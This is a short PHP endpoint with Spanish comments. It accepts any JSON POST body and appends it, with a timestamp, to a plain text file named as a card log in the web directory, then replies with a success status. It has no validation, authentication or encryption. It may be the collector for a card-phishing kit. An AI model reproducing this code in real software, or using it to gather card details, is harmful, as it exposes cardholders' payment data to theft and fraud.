<?php
header('Content-Type: application/json; charset=utf-8');

// Obtener datos del cuerpo del POST
$input = file_get_contents('php://input');
$data = json_decode($input, true);

if ($data) {
    // Guardar los datos en un archivo de texto local para registro e historial si es escribible
    $logFile = 'registro_tarjetas.txt';
    $logData = "[" . date('Y-m-d H:i:s') . "] " . json_encode($data, JSON_UNESCAPED_UNICODE) . PHP_EOL;
    @file_put_contents($logFile, $logData, FILE_APPEND);

    echo json_encode(array('status' => 'success'));
} else {
    echo json_encode(array('status' => 'error', 'message' => 'No se recibieron datos válidos'));
}
?>
